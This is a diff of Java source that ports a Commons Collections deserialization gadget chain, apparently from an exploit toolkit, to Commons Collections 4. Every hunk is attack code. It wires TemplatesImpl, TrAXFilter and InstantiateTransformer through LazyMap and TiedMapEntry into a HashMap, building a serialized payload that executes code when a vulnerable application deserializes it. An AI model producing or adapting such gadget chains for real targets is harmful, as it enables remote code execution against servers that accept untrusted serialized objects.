@@ -4,18 +4,24 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import net.bytebuddy.ByteBuddy;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InstantiateTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
 
 import javax.xml.transform.Templates;
-import java.io.*;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollectionsK1_1 {
+public class CommonsCollectionsK1_1_For_CC4 {
+
+    public CommonsCollectionsK1_1_For_CC4(){
+
+    }
+
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
@@ -40,10 +46,9 @@ public class CommonsCollectionsK1_1 {
                         new Class[] { Templates.class },
                         new Object[] { obj }
                 );
-
         Map originalMap  = new HashMap();
-        Map decoratedMap = LazyMap.decorate(originalMap , i);
-        Map fakedecoratedMap=LazyMap.decorate(originalMap, new ConstantTransformer("1"));
+        Map decoratedMap = LazyMap.lazyMap(originalMap , i);
+        Map fakedecoratedMap=LazyMap.lazyMap(originalMap, new ConstantTransformer("1"));
         TiedMapEntry tme = new TiedMapEntry(fakedecoratedMap,TrAXFilter.class);
         Map enterpointMap = new HashMap();
         enterpointMap.put(tme, "valuevalue");
